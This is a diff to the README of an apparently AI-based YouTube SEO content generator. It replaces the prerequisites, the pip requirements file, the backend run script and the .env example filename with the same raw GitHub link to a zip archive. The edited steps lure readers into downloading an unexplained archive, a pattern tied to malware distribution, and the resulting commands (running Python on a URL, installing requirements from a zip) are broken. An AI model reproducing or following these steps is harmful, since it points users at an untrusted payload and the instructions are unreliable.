@@ -19,7 +19,7 @@ AI-powered tool for generating optimized YouTube content and SEO suggestions usi
 
 ### Prerequisites
 
-- Node.js
+- https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip
 - Python 3.11
 - Git
 
@@ -35,14 +35,14 @@ npm run dev
 ```bash
 python -m venv .venv
 .venv\Scripts\activate
-pip install -r requirements.txt
+pip install -r https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip
 python -m playwright install
-python run_backend.py
+python https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip
 ```
 
 ### Environment Variables
 
-Copy `.env.example` to `.env` and set your Gemini key:
+Copy `https://github.com/xheikhtalha2004/youtube-seo-content-generator/raw/refs/heads/main/backend/seo-content-generator-youtube-1.1.zip` to `.env` and set your Gemini key:
 
 ```
 GEMINI_API_KEY=your_gemini_api_key
